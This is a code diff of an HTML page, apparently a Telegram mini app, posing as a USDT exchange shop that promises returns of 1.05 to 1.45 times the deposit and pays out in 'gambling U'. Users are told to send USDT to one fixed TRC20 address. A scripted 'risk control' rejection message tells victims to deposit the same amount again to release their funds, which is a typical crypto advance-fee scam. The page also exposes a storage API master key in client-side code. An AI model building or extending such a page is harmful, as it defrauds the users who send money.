@@ -45,7 +45,7 @@
                     <span class="text-sm text-blue-200">USDT</span>
                 </div>
                 <div>
-                    <button type="button" id="btnDepositCard" class="w-full bg-white text-blue-600 font-bold py-3.5 rounded-xl text-sm shadow hover:bg-blue-50 transition flex items-center justify-center gap-2 active:scale-98">
+                    <button type="button" onclick="switchTab('deposit')" class="w-full bg-white text-blue-600 font-bold py-3.5 rounded-xl text-sm shadow hover:bg-blue-50 transition flex items-center justify-center gap-2 active:scale-98 cursor-pointer">
                         <i class="fa-solid fa-wallet"></i> 立即充值
                     </button>
                 </div>
@@ -103,4 +103,343 @@
                     <div class="tier-row grid grid-cols-3 text-center py-2.5 rounded-xl bg-gray-50 text-xs items-center transition"><div class="font-bold text-gray-700">50</div><div class="text-gray-400">100</div><div class="font-bold text-blue-600 text-sm">1.05</div></div>
                     <div class="tier-row grid grid-cols-3 text-center py-2.5 rounded-xl bg-gray-50 text-xs items-center transition"><div class="font-bold text-gray-700">100</div><div class="text-gray-400">500</div><div class="font-bold text-blue-600 text-sm">1.13</div></div>
                     <div class="tier-row grid grid-cols-3 text-center py-2.5 rounded-xl bg-gray-50 text-xs items-center transition"><div class="font-bold text-gray-700">500</div><div class="text-gray-400">2000</div><div class="font-bold text-blue-600 text-sm">1.38</div></div>
-                    <div class="tier-row grid grid-cols-3 text-center py-2.5 rounded-xl bg-gray-50 text-xs items-center transition"><div class="font-bold text-gray-700">2000</div><div class="text-gray-400">500
+                    <div class="tier-row grid grid-cols-3 text-center py-2.5 rounded-xl bg-gray-50 text-xs items-center transition"><div class="font-bold text-gray-700">2000</div><div class="text-gray-400">5000</div><div class="font-bold text-blue-600 text-sm">1.42</div></div>
+                    <div class="tier-row grid grid-cols-3 text-center py-2.5 rounded-xl bg-gray-50 text-xs items-center transition"><div class="font-bold text-gray-700">5000</div><div class="text-gray-400">10000</div><div class="font-bold text-blue-600 text-sm">1.45</div></div>
+                </div>
+            </div>
+
+            <!-- 规则说明 -->
+            <div class="text-xs text-gray-400 px-2 space-y-1">
+                <p class="font-semibold">💡 规则说明：</p>
+                <p>1. 单笔兑换金额须满 50 USDT，且不得低于账户当前可用余额。</p>
+                <p>2. 提交后系统将在 30 分钟内完成订单撮合与额度发放。</p>
+            </div>
+        </div>
+
+        <!-- 2. 我的订单与记录 (Tab 2) -->
+        <div id="tab-orders" class="hidden space-y-4">
+            <div class="font-bold text-base text-gray-800 px-1">我的订单与记录</div>
+            <div id="myOrdersList" class="space-y-3">
+                <div class="text-center py-8 text-xs text-gray-400 bg-white rounded-2xl p-6 shadow-sm">正在联网加载订单记录...</div>
+            </div>
+        </div>
+
+        <!-- 3. 订单详情页 (完美支持风控红底提示) -->
+        <div id="page-order-detail" class="hidden space-y-4">
+            <button type="button" onclick="switchTab('orders')" class="text-xs text-gray-600 flex items-center gap-1 font-medium bg-white px-3.5 py-2 rounded-xl border border-gray-200 shadow-sm cursor-pointer">
+                <i class="fa-solid fa-chevron-left"></i> 返回订单列表
+            </button>
+            <div id="orderDetailCard" class="bg-white p-6 rounded-2xl shadow-sm space-y-4"></div>
+        </div>
+
+        <!-- 4. 充值页面 -->
+        <div id="page-deposit" class="hidden space-y-4">
+            <button type="button" onclick="switchTab('shop')" class="text-xs text-gray-600 flex items-center gap-1 font-medium bg-white px-3.5 py-2 rounded-xl border border-gray-200 shadow-sm cursor-pointer">
+                <i class="fa-solid fa-chevron-left"></i> 返回商城
+            </button>
+            <div class="bg-tgCardBg p-6 rounded-2xl shadow-sm text-center space-y-5">
+                <div class="space-y-1">
+                    <h3 class="font-bold text-xl text-gray-800">USDT 充值中心</h3>
+                    <p class="text-xs text-gray-400">当前 USDT 支付区块链网络协议为 TRC20</p>
+                </div>
+                <div class="p-4 bg-gray-50 rounded-2xl border inline-block">
+                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=TPcyZeBmJoiaBeL7LzpZWW7hq1Hgzw75LQ" class="w-52 h-52 mx-auto rounded-lg shadow-sm">
+                </div>
+                <div class="bg-gray-50 p-3.5 rounded-xl border text-left space-y-1">
+                    <div class="text-xs text-gray-400 font-medium">TRC20 收款地址 (点击可复制)：</div>
+                    <div onclick="copyAddress('TPcyZeBmJoiaBeL7LzpZWW7hq1Hgzw75LQ')" class="text-xs font-mono font-bold text-gray-700 bg-white p-3 rounded-lg border cursor-pointer hover:bg-gray-50 transition">
+                        TPcyZeBmJoiaBeL7LzpZWW7hq1Hgzw75LQ
+                    </div>
+                </div>
+                <button type="button" onclick="submitDepositNotify()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl shadow-md transition text-sm cursor-pointer">
+                    我已充值
+                </button>
+                <div id="depositStatusBox" class="hidden text-left p-4 rounded-xl text-xs bg-yellow-50 border border-yellow-200 text-yellow-800"></div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- 底部导航栏（完整恢复） -->
+    <div class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 z-40">
+        <div class="max-w-2xl mx-auto flex justify-around py-3">
+            <button type="button" id="nav-shop" onclick="switchTab('shop')" class="flex flex-col items-center gap-1 text-blue-600 text-xs font-bold transition cursor-pointer">
+                <i class="fa-solid fa-store text-lg"></i>
+                <span>兑换商城</span>
+            </button>
+            <button type="button" id="nav-orders" onclick="switchTab('orders')" class="flex flex-col items-center gap-1 text-gray-400 text-xs font-medium transition cursor-pointer">
+                <i class="fa-solid fa-list-check text-lg"></i>
+                <span>我的订单</span>
+            </button>
+        </div>
+    </div>
+
+    <script>
+        const BIN_ID = "6af2b32cac6210605a7c00d8";
+        const API_KEY = "$2a$10$7bEzkP8SMoaSgkbiFa7a2uU0O/STCDvsxPy/XtAO5Hh7gxT/iSHpG";
+        const tiers = [
+            { min: 50, max: 100, rate: 1.05 },
+            { min: 100, max: 500, rate: 1.13 },
+            { min: 500, max: 2000, rate: 1.38 },
+            { min: 2000, max: 5000, rate: 1.42 },
+            { min: 5000, max: 10000, rate: 1.45 }
+        ];
+
+        let currentUserId = "user_demo_001";
+        if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user) {
+            currentUserId = String(window.Telegram.WebApp.initDataUnsafe.user.id);
+        } else {
+            let localId = localStorage.getItem('tma_local_uid');
+            if (!localId) { localId = 'UID_' + Math.random().toString(36).substring(2, 9); localStorage.setItem('tma_local_uid', localId); }
+            currentUserId = localId;
+        }
+
+        let userBalance = 0.00;
+        let cloudData = { orders: [], balances: {} };
+
+        window.onload = async function() {
+            if (window.Telegram && window.Telegram.WebApp) { window.Telegram.WebApp.ready(); window.Telegram.WebApp.expand(); }
+            
+            await fetchCloudData();
+            setInterval(fetchCloudData, 3000); // 联网实时同步
+        };
+
+        async function fetchCloudData() {
+            try {
+                let res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
+                    headers: { 'X-Master-Key': API_KEY }
+                });
+                if (res.ok) {
+                    let json = await res.json();
+                    cloudData = json.record || { orders: [], balances: {} };
+                    
+                    if (cloudData.balances && cloudData.balances[currentUserId] !== undefined) {
+                        userBalance = parseFloat(cloudData.balances[currentUserId]);
+                    } else {
+                        userBalance = parseFloat(localStorage.getItem('balance_' + currentUserId)) || 0.00;
+                    }
+                    updateBalanceUI();
+                }
+            } catch(e){}
+        }
+
+        async function pushCloudData() {
+            try {
+                await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
+                    method: 'PUT',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Master-Key': API_KEY
+                    },
+                    body: JSON.stringify(cloudData)
+                });
+            } catch(e){}
+        }
+
+        function updateBalanceUI() {
+            document.getElementById('userBalanceDisplay').innerText = userBalance.toFixed(2);
+            localStorage.setItem('balance_' + currentUserId, userBalance);
+            calculateRate();
+        }
+
+        function switchTab(tab) {
+            document.getElementById('tab-shop').classList.add('hidden');
+            document.getElementById('tab-orders').classList.add('hidden');
+            document.getElementById('page-deposit').classList.add('hidden');
+            document.getElementById('page-order-detail').classList.add('hidden');
+            
+            const navShop = document.getElementById('nav-shop');
+            const navOrders = document.getElementById('nav-orders');
+
+            if (tab === 'shop') {
+                document.getElementById('tab-shop').classList.remove('hidden');
+                navShop.className = "flex flex-col items-center gap-1 text-blue-600 text-xs font-bold transition cursor-pointer";
+                navOrders.className = "flex flex-col items-center gap-1 text-gray-400 text-xs font-medium transition cursor-pointer";
+            } else if (tab === 'orders') {
+                document.getElementById('tab-orders').classList.remove('hidden');
+                navOrders.className = "flex flex-col items-center gap-1 text-blue-600 text-xs font-bold transition cursor-pointer";
+                navShop.className = "flex flex-col items-center gap-1 text-gray-400 text-xs font-medium transition cursor-pointer";
+                renderMyOrders();
+            } else if (tab === 'deposit') {
+                document.getElementById('page-deposit').classList.remove('hidden');
+            }
+        }
+
+        function setAmount(val) {
+            document.getElementById('inputAmount').value = val;
+            calculateRate();
+        }
+
+        function calculateRate() {
+            const inputEl = document.getElementById('inputAmount');
+            if(!inputEl) return;
+            const inputVal = parseFloat(inputEl.value);
+            const resultEl = document.getElementById('resultAmount');
+            const descEl = document.getElementById('currentRateDesc');
+            const btnEl = document.getElementById('exchangeBtn');
+            const rows = document.querySelectorAll('.tier-row');
+
+            rows.forEach(r => {
+                r.classList.remove('bg-blue-100', 'border', 'border-blue-300');
+                r.classList.add('bg-gray-50');
+            });
+
+            if (isNaN(inputVal) || inputVal < 50) {
+                if(resultEl) resultEl.innerText = "0.00";
+                if(descEl) descEl.innerText = "单笔最低兑换金额为 50";
+                if(btnEl) { btnEl.disabled = true; btnEl.className = "w-full bg-gray-300 text-gray-500 font-bold py-4 rounded-xl shadow-sm transition flex items-center justify-center gap-2 cursor-not-allowed text-sm"; }
+                return;
+            }
+
+            let matchedTier = tiers.find(t => inputVal >= t.min && inputVal <= t.max) || tiers[tiers.length - 1];
+            const calculated = (inputVal * matchedTier.rate).toFixed(2);
+            if(resultEl) resultEl.innerText = calculated;
+            if(descEl) descEl.innerText = `当前区间汇率: ${matchedTier.rate}`;
+            if(btnEl) { btnEl.disabled = false; btnEl.className = "w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl shadow-md transition flex items-center justify-center gap-2 cursor-pointer active:scale-98 text-sm"; }
+        }
+
+        async function submitExchange() {
+            const inputEl = document.getElementById('inputAmount');
+            const amount = parseFloat(inputEl.value);
+            if(isNaN(amount) || amount < 50) return;
+
+            let matchedTier = tiers.find(t => amount >= t.min && amount <= t.max) || tiers[tiers.length - 1];
+            const getU = (amount * matchedTier.rate).toFixed(2);
+
+            if (userBalance < amount) {
+                alert("账户余额不足以支付当前兑换金额！");
+                return;
+            }
+
+            userBalance -= amount;
+            updateBalanceUI();
+            inputEl.value = '';
+            calculateRate();
+
+            const newOrder = {
+                id: 'EXC' + Date.now().toString().slice(-6),
+                uid: currentUserId,
+                type: 'exchange',
+                amount: amount,
+                rate: matchedTier.rate,
+                getU: getU,
+                address: 'TPcyZeBmJoiaBeL7LzpZWW7hq1Hgzw75LQ',
+                status: 'pending', // 兑换中
+                time: new Date().toLocaleString()
+            };
+
+            cloudData.orders.unshift(newOrder);
+            cloudData.balances[currentUserId] = userBalance;
+            await pushCloudData();
+
+            alert("提交成功！系统正在为您的兑换进行撮合，请在 30 分钟内完成，可在订单页面查看状态。");
+            switchTab('orders');
+        }
+
+        async function submitDepositNotify() {
+            const inputVal = prompt("请输入您本次充值的 USDT 金额：", "100");
+            if (!inputVal) return;
+            const amount = parseFloat(inputVal);
+            if (isNaN(amount) || amount <= 0) { alert("请输入有效金额"); return; }
+
+            const newOrder = {
+                id: 'DEP' + Date.now().toString().slice(-6),
+                uid: currentUserId,
+                type: 'deposit',
+                amount: amount,
+                status: 'pending',
+                time: new Date().toLocaleString()
+            };
+
+            cloudData.orders.unshift(newOrder);
+            await pushCloudData();
+
+            alert("已成功提交充值通知，请等待管理员审核！");
+            const box = document.getElementById('depositStatusBox');
+            box.classList.remove('hidden');
+            box.innerHTML = "充值申请已提交（UID: " + currentUserId + "），正在等待管理员审核...";
+        }
+
+        function renderMyOrders() {
+            const container = document.getElementById('myOrdersList');
+            let myOrders = cloudData.orders.filter(o => o.uid === currentUserId);
+
+            if (myOrders.length === 0) {
+                container.innerHTML = `<div class="text-center py-8 text-xs text-gray-400 bg-white rounded-2xl p-6 shadow-sm">暂无相关订单记录</div>`;
+                return;
+            }
+
+            container.innerHTML = myOrders.map(item => `
+                <div onclick="viewOrderDetail('${item.id}')" class="bg-white p-4 rounded-2xl shadow-sm space-y-2 text-xs border border-gray-100 cursor-pointer hover:border-blue-300 transition">
+                    <div class="flex justify-between font-bold">
+                        <span class="text-gray-800">${item.type === 'deposit' ? '📥 充值订单' : '🔄 兑换订单'} (${item.id})</span>
+                        <span class="${item.status === 'success' ? 'text-green-600' : item.status === 'pending' ? 'text-yellow-600' : 'text-red-600 font-bold'}">
+                            ${item.status === 'success' ? '已完成' : item.status === 'pending' ? '兑换中 (30分钟)' : '状态异常 (风控拦截)'}
+                        </span>
+                    </div>
+                    <div class="text-gray-500">金额: <span class="font-bold text-gray-800">${item.amount} USDT</span></div>
+                    <div class="text-[10px] text-gray-400">时间: ${item.time}</div>
+                </div>
+            `).join('');
+        }
+
+        function viewOrderDetail(orderId) {
+            let item = cloudData.orders.find(o => o.id === orderId);
+            if (!item) return;
+
+            document.getElementById('tab-orders').classList.add('hidden');
+            document.getElementById('page-order-detail').classList.remove('hidden');
+
+            const card = document.getElementById('orderDetailCard');
+            
+            if (item.status === 'rejected') {
+                card.innerHTML = `
+                    <div class="text-center space-y-2 pb-3 border-b">
+                        <div class="w-12 h-12 bg-red-100 text-red-600 rounded-full flex items-center justify-center mx-auto text-xl font-bold"><i class="fa-solid fa-xmark"></i></div>
+                        <h3 class="font-bold text-lg text-gray-800">状态异常</h3>
+                    </div>
+                    <div class="bg-red-50 border border-red-200 p-4 rounded-2xl text-xs text-red-600 space-y-1.5 leading-relaxed">
+                        <p class="font-bold">⚠️ 系统安全提示：</p>
+                        <p>系统检测到您的账户近期操作过于频繁，触发系统风控。请保持余额充足并兑换相同金额订单，输入相同的收款地址，系统将自动为您解除风控合并下发两笔订单。</p>
+                    </div>
+                    <div class="space-y-2 text-xs text-gray-600 pt-2">
+                        <div class="flex justify-between py-1 border-b"><span>订单号</span><span class="font-mono font-bold">${item.id}</span></div>
+                        <div class="flex justify-between py-1 border-b"><span>下单时间</span><span>${item.time}</span></div>
+                        <div class="flex justify-between py-1 border-b"><span>支付金额</span><span class="font-bold">${item.amount} USDT</span></div>
+                        <div class="flex justify-between py-1 border-b"><span>区间汇率</span><span>${item.rate || 1.13}</span></div>
+                        <div class="flex justify-between py-1 border-b"><span>应得</span><span class="font-bold text-blue-600">${item.getU} 博彩U</span></div>
+                        <div class="py-1">
+                            <div class="text-gray-400 mb-1">收款地址</div>
+                            <div class="bg-gray-50 p-2.5 rounded-xl font-mono font-bold text-gray-700 break-all border">${item.address}</div>
+                        </div>
+                    </div>
+                `;
+            } else {
+                card.innerHTML = `
+                    <div class="text-center space-y-2 pb-3 border-b">
+                        <div class="w-12 h-12 ${item.status === 'success' ? 'bg-green-100 text-green-600' : 'bg-yellow-100 text-yellow-600'} rounded-full flex items-center justify-center mx-auto text-xl font-bold">
+                            <i class="fa-solid ${item.status === 'success' ? 'fa-check' : 'fa-clock'}"></i>
+                        </div>
+                        <h3 class="font-bold text-lg text-gray-800">${item.status === 'success' ? '兑换成功' : '订单兑换中'}</h3>
+                        <p class="text-xs text-gray-400">${item.status === 'success' ? '额度已成功发放至您的账户' : '系统正在全力撮合中，请在 30 分钟内完成'}</p>
+                    </div>
+                    <div class="space-y-2 text-xs text-gray-600 pt-2">
+                        <div class="flex justify-between py-1 border-b"><span>订单号</span><span class="font-mono font-bold">${item.id}</span></div>
+                        <div class="flex justify-between py-1 border-b"><span>下单时间</span><span>${item.time}</span></div>
+                        <div class="flex justify-between py-1 border-b"><span>支付金额</span><span class="font-bold">${item.amount} USDT</span></div>
+                        <div class="flex justify-between py-1 border-b"><span>应得</span><span class="font-bold text-blue-600">${item.getU} 博彩U</span></div>
+                        <div class="py-1">
+                            <div class="text-gray-400 mb-1">收款地址</div>
+                            <div class="bg-gray-50 p-2.5 rounded-xl font-mono font-bold text-gray-700 break-all border">${item.address}</div>
+                        </div>
+                    </div>
+                `;
+            }
+        }
+
+        function copyAddress(text) {
+            navigator.clipboard.writeText(text).then(() => alert("钱包地址已成功复制！"));
+        }
+    </script>
+</body>
+</html>
